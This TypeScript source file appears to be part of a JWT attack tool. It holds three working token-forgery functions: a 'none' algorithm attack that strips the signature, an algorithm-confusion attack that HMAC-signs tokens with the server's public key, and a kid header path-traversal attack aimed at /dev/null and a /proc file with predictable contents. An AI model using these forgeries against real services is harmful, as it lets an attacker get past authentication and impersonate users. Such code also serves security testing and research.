import { getJwtParts, encodeJwtPart } from "./jwt";
import hmacSha256 from 'crypto-js/hmac-sha256'
import Base64Url from 'crypto-js/enc-base64url'
import { EKidPayload } from "~/commons/enums/kid-payloads-enum";
import { NoneAttackEnum } from "~/commons/enums/none-attack-enum";

export function noneAttack(token: string, algorithm: NoneAttackEnum) {
    const algorithms = {
        [NoneAttackEnum.NONE]: 'none',
        [NoneAttackEnum.EMPTY]: '',
        [NoneAttackEnum.FALSE]: false,
        [NoneAttackEnum.NULL]: null,
    };

    let [header, payload] = getJwtParts(token);
    header.alg = algorithms[algorithm];
    
    header = encodeJwtPart(header);
    payload = encodeJwtPart(payload);

    return `${header}.${payload}.`;
}

export function algorithmConfusion(token: string, publicKey: string, symmetricAlg: string = "HS256") {
    let [header, payload] = getJwtParts(token);

    header.alg = symmetricAlg;

    header = encodeJwtPart(header);
    payload = encodeJwtPart(payload);
    
    let sign = Base64Url.stringify(hmacSha256(`${header}.${payload}`, publicKey));

    return `${header}.${payload}.${sign}`;
}

export function kidPathTraversal(token: string, signaturePayload: EKidPayload) {
    let [header, payload] = getJwtParts(token);

    header.kid = signaturePayload;

    header = encodeJwtPart(header);
    payload = encodeJwtPart(payload);

    const signatures = {
        [EKidPayload.DEV_NULL]: '',
        [EKidPayload.RANDOMIZE_VA_SPACE]: 2
    }

    let sign = Base64Url.stringify(hmacSha256(`${header}.${payload}`, signatures[signaturePayload].toString()));

    return `${header}.${payload}.${sign}`;
}